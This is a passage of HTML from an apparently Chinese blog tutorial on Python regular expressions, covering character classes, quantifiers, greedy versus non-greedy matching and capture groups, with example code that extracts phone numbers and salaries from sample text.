src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625002450442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再来一个没加 \ 的</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> re                    <span class="token comment" spellcheck="true"># 导入re包</span>a <span class="token operator">=</span> <span class="token string">'tp,top$,toop,top'</span>       <span class="token comment" spellcheck="true"># 定义一个字符串a</span>c <span class="token operator">=</span> r<span class="token string">'top$'</span>                  <span class="token comment" spellcheck="true"># 定义c的正则规则</span><span class="token keyword">print</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>c<span class="token punctuation">,</span>a<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 用规则c去匹配字符a并输出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对比一下，就知道这个 \ 是干吗用的了：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625002555618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="（竖线）"><a href="#（竖线）" class="headerlink" title="|（竖线）"></a>|（竖线）</h5><ul><li>竖线表示 匹配 其中之一 。</li></ul><p>特别要注意的是， 竖线在正则表达式的优先级是最低的， 这就意味着，竖线隔开的部分是一个整体</p><pre><code>比如 绿色|橙 表示 要匹配是 绿色 或者 橙 ，而不是 绿色 或者 绿橙</code></pre><p>例如：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625144856934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p>\d：匹配数字，效果同[0-9]</p><pre><code>    \d      表示匹配任意一个数字，这里可以不写[]，直接使用\d    [^\d]   表示匹配所有的非数字字符，效果同[^0-9]</code></pre><p>例子：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> recontent <span class="token operator">=</span> <span class="token string">'123，456，789'</span>p <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\d'</span><span class="token punctuation">)</span><span class="token keyword">for</span> one <span class="token keyword">in</span> p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625065852200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>\D：匹配非数字字符，效果同[^0-9]</p><p>例子：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> re                    <span class="token comment" spellcheck="true"># 导入re包</span>a <span class="token operator">=</span> <span class="token string">'tpt 123 456 789'</span>       <span class="token comment" spellcheck="true"># 定义一个字符串a</span>c <span class="token operator">=</span> r<span class="token string">'\D'</span>                   <span class="token comment" spellcheck="true"># 定义c的正则规则</span><span class="token keyword">print</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>c<span class="token punctuation">,</span>a<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 用规则c去匹配字符a并输出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625004047996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>\w：匹配数字、字母和下划线，效果同[0-9a-zA-Z]</p><p>例子：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> re                    <span class="token comment" spellcheck="true"># 导入re包</span>a <span class="token operator">=</span> <span class="token string">'tpt 123 456 789'</span>       <span class="token comment" spellcheck="true"># 定义一个字符串a</span>c <span class="token operator">=</span> r<span class="token string">'\w'</span>                   <span class="token comment" spellcheck="true"># 定义c的正则规则</span><span class="token keyword">print</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>c<span class="token punctuation">,</span>a<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 用规则c去匹配字符a并输出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625004202244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>\W：匹配非数字、字母和下划线，效果同[^0-9a-zA-Z]</p><p>例子：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> re                    <span class="token comment" spellcheck="true"># 导入re包</span>a <span class="token operator">=</span> <span class="token string">'tpt 123 456 789'</span>       <span class="token comment" spellcheck="true"># 定义一个字符串a</span>c <span class="token operator">=</span> r<span class="token string">'\W'</span>                   <span class="token comment" spellcheck="true"># 定义c的正则规则</span><span class="token keyword">print</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>c<span class="token punctuation">,</span>a<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 用规则c去匹配字符a并输出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625004242297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>\s：匹配任意的空白符(空格、换行、回车、换页、制表符)，效果同[ \f\n\r\t]</p><p>例子：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> re                    <span class="token comment" spellcheck="true"># 导入re包</span>a <span class="token operator">=</span> <span class="token string">'tpt 123  789 \n'</span>       <span class="token comment" spellcheck="true"># 定义一个字符串a</span>c <span class="token operator">=</span> r<span class="token string">'\s'</span>                   <span class="token comment" spellcheck="true"># 定义c的正则规则</span><span class="token keyword">print</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>c<span class="token punctuation">,</span>a<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 用规则c去匹配字符a并输出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625004539390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>\S：匹配任意的非空白符(空格、换行、回车、换页、制表符)，效果同[^ \f\n\r\t]</p><p>例子：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> re                    <span class="token comment" spellcheck="true"># 导入re包</span>a <span class="token operator">=</span> <span class="token string">'tpt 123  789 \n'</span>       <span class="token comment" spellcheck="true"># 定义一个字符串a</span>c <span class="token operator">=</span> r<span class="token string">'\S'</span>                   <span class="token comment" spellcheck="true"># 定义c的正则规则</span><span class="token keyword">print</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>c<span class="token punctuation">,</span>a<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 用规则c去匹配字符a并输出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625004624487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="正则特性"><a href="#正则特性" class="headerlink" title="正则特性"></a>正则特性</h3><h5 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h5><p>例子：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> re                             <span class="token comment" spellcheck="true"># 导入re包</span>a <span class="token operator">=</span> <span class="token string">'tpt 010-88888888 abc 123'</span>       <span class="token comment" spellcheck="true"># 定义一个字符串a</span>c <span class="token operator">=</span> r<span class="token string">'\d{3}-\d{8}'</span>                   <span class="token comment" spellcheck="true"># 重复匹配三次数字-重复匹配八次数字</span><span class="token keyword">print</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>c<span class="token punctuation">,</span>a<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># 用规则c去匹配字符a并输出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020062500592393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h6 id="（星号）"><a href="#（星号）" class="headerlink" title="*（星号）"></a>*（星号）</h6><ul><li>星号的作用就是指定前一个字符可以被匹配0次或更多次，匹配引擎会试着重复（贪婪匹配，尽可能多的去匹配）</li></ul><p>例子：</p><pre class="line-numbers language-python"><code class="language-python">content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''苹果，是绿色色色色色的橙子，是橙色的草莓，是红色的乌鸦，是黑色的'''</span><span class="token keyword">import</span> rep <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'绿色*'</span><span class="token punctuation">)</span><span class="token keyword">for</span> one <span class="token keyword">in</span> p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>图形化正则：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625060947915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625061012327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h6 id="（加号）"><a href="#（加号）" class="headerlink" title="+（加号）"></a>+（加号）</h6><ul><li>加号表示匹配至少一次或多次，也是贪婪匹配（尽可能多的去匹配）</li></ul><p>这里的加号，一定要跟星号对比起来，搞清楚两者的区别，星号是可以出现0次的，但加号至少要出现一次，这就是两者的区别，这样说很模糊，我上两个例子大家体会一下</p><p>星号例子：</p><pre class="line-numbers language-python"><code class="language-python">content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''苹果，是绿色色色色色色色的橙子，是橙色的草莓，是红色的乌鸦，是绿色的猴子，是绿'''</span><span class="token keyword">import</span> rep <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'绿色*'</span><span class="token punctuation">)</span><span class="token keyword">for</span> one <span class="token keyword">in</span> p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625061631148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>加号例子（代码就不贴了）：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625061712306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因为星号包括0次，所以绿后面即使没有字符，也可以被输出，但是加号至少包含一次，所以单个绿就不会被输出，因为它后面是0个色，要求是至少一个色，我们可以借助两者的图形化正则来对比，就很容易明白他们的区别了：</p><p>加号：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625061851730.png" alt="在这里插入图片描述"><br>星号：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625061920140.png" alt="在这里插入图片描述"></p><h6 id="（问号）"><a href="#（问号）" class="headerlink" title="?（问号）"></a>?（问号）</h6><ul><li>问号就是最小匹配它前面的字符，匹配一次或零次</li></ul><p>例子：</p><pre class="line-numbers language-python"><code class="language-python">content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''苹果，是绿色色色色色色色的橙子，是橙色的草莓，是红色的乌鸦，是绿色的猴子，是绿'''</span><span class="token keyword">import</span> rep <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'是.色?'</span><span class="token punctuation">)</span><span class="token keyword">for</span> one <span class="token keyword">in</span> p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>图形化正则：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625062555787.png" alt="在这里插入图片描述"><br>因为它允许匹配零次，所以最后一句即使后面没有色，是绿也会被输出，看一下运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625062342114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h6 id="（花括号）"><a href="#（花括号）" class="headerlink" title="{}（花括号）"></a>{}（花括号）</h6><p>正则的一个特性是你可以匹配任意长度字符集，另一个就是你可以指定表达式的一部分重复次数</p><p>这里提到的这个{}，作用是指定重复次数，用它搭配\d来实现一个过滤手机号码的脚本：</p><pre class="line-numbers language-python"><code class="language-python">content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''小李，15688887894，21小张，18866716789，23小王，13512342233，26小崔，13552342133，18小刘，13510348233，35小唐，13211232243，42'''</span><span class="token keyword">import</span> rep <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\d{11}'</span><span class="token punctuation">)</span><span class="token keyword">for</span> one <span class="token keyword">in</span> p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>图形化正则：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625065101548.png" alt="在这里插入图片描述"><br>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625064000326.png" alt="在这里插入图片描述"></p><h3 id="贪婪匹配与非贪婪匹配"><a href="#贪婪匹配与非贪婪匹配" class="headerlink" title="贪婪匹配与非贪婪匹配"></a>贪婪匹配与非贪婪匹配</h3><p>假如我们现在定义了一个字符集，要把下面的标签全部都取出来</p><pre class="line-numbers language-python"><code class="language-python">content <span class="token operator">=</span> <span class="token string">'&lt;html>&lt;title>&lt;/title>&lt;/html>'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要这种效果：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token string">'&lt;html>'</span><span class="token punctuation">,</span> <span class="token string">'&lt;title>'</span><span class="token punctuation">,</span> <span class="token string">'&lt;/title>'</span><span class="token punctuation">,</span> <span class="token string">'&lt;/html>'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>思路大概已经有了，就是匹配尖括号里的内容即可：</p><pre class="line-numbers language-python"><code class="language-python">content <span class="token operator">=</span> <span class="token string">'&lt;html>&lt;title>&lt;/title>&lt;/html>'</span><span class="token keyword">import</span> rep <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'&lt;.*>'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是这样输出的结果是这样的：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token string">'&lt;html>&lt;title>&lt;/title>&lt;/html>'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这就不符合题意了，这也就是所谓的“贪婪匹配”，就是尽可能多的去匹配，两个尖括号中间的，那么我就取整个字符集好了，刚好就是两个尖括号组成的，所以我们想要符合题意，就要对星号进行限制，就是给它加一个问号</p><pre class="line-numbers language-python"><code class="language-python">content <span class="token operator">=</span> <span class="token string">'&lt;html>&lt;title>&lt;/title>&lt;/html>'</span><span class="token keyword">import</span> rep <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'&lt;.*?>'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样运行后就符合题意了，可以看一下加问号与不加问号的图形化正则：</p><p>加问号：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625071158150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不加：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625071221819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">所以在日后的编程中要注意星号与加号，如果想要尽可能少，就加问号，反之不加。</p><h3 id="正则中的组选择"><a href="#正则中的组选择" class="headerlink" title="正则中的组选择"></a>正则中的组选择</h3><h6 id="（括号）"><a href="#（括号）" class="headerlink" title="()（括号）"></a>()（括号）</h6><ul><li><p>括号称之为 正则表达式的 组选择。</p></li><li><p>组 就是把 正则表达式 匹配的内容 里面 其中的某些部分 标记为某个组。</p></li><li><p>我们可以在 正则表达式中 标记 多个 组</p><pre><code> 为什么要有组的概念呢？因为我们往往需要提取已经匹配的 内容里面的 某些部分的信息。 前面，我们有个例子，从下面的文本中，选择每行逗号前面的字符串，也包括逗号本身 。</code></pre><pre class="line-numbers language-python"><code class="language-python"> 苹果，苹果是绿色的 橙子，橙子是橙色的 香蕉，香蕉是黄色的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>代码可以这样写：</p></li></ul><pre class="line-numbers language-python"><code class="language-python">content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''苹果，苹果是绿色的橙子，橙子是橙色的香蕉，香蕉是黄色的'''</span><span class="token keyword">import</span> rep <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'.*，'</span><span class="token punctuation">)</span><span class="token keyword">for</span> one <span class="token keyword">in</span>  p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是运行后输出的结果带着逗号，我们又不希望逗号出现，所以我们在这里使用()把前面的规则括起来，表示我们只取括号内的信息：</p><pre class="line-numbers language-python"><code class="language-python">content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''苹果，苹果是绿色的橙子，橙子是橙色的香蕉，香蕉是黄色的'''</span><span class="token keyword">import</span> rep <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'(.*)，'</span><span class="token punctuation">)</span><span class="token keyword">for</span> one <span class="token keyword">in</span>  p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>图形化正则：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625145945694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625145859844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那么这是一组的，如果我们要提取多组呢？比如我们现在从网上抓取了一组数据，要求只输出姓名+电话号码</p><pre class="line-numbers language-python"><code class="language-python">张三，手机号<span class="token number">13388881234</span>李四，手机号<span class="token number">15612348821</span>王五，手机号<span class="token number">17456136666</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>那么代码可以这样写：</p><pre class="line-numbers language-python"><code class="language-python">content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''张三，手机号13388881234李四，手机号15612348821王五，手机号17456136666'''</span><span class="token keyword">import</span> rep <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'(^.+)，手机号(\d{11})'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>M<span class="token punctuation">)</span><span class="token keyword">for</span> one <span class="token keyword">in</span>  p<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>one<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>图形化正则：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625151235816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200625151312550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="做一个练习"><a href="#做一个练习" class="headerlink" title="做一个练习"></a>做一个练习</h3><p>现在我们从网上抓取了一则招聘信息，要求只输出薪资数字：</p><pre class="line-numbers language-python"><code class="language-python">Python3 高级开发工程师 上海互教教育科技有限公司上海<span class="token operator">-</span>浦东新区<span class="token number">2</span>万<span class="token operator">/</span>月<span class="token number">02</span><span class="token operator">-</span><span class="token number">18</span>满员测试开发工程师（C<span class="token operator">+</span><span class="token operator">+</span><span class="token operator">/</span>python） 上海墨鹍数码科技有限公司上海<span class="token operator">-</span>浦东新区<span class="token number">2.5</span>万<span class="token operator">/</span>每月<span class="token number">02</span><span class="token operator">-</span><span class="token number">18</span>未满员Python3 开发工程师 上海德拓信息技术股份有限公司上海<span class="token operator">-</span>徐汇区<span class="token number">1.3</span>万<span class="token operator">/</span>每月<span class="token number">02</span><span class="token operator">-</span><span class="token number">18</span>剩余<span class="token number">11</span>人测试开发工程师（Python） 赫里普（上海）信息科技有限公司上海<span class="token operator">-</span>浦东新区<span class="token number">1.1</span>万<span class="token operator">/</span>每月<span class="token number">02</span><span class="token operator">-</span><span class="token number">18</span>剩余<span class="token number">5</span>人<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>那么表达式可以这么写：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">[</span>\d<span class="token punctuation">.</span><span class="token 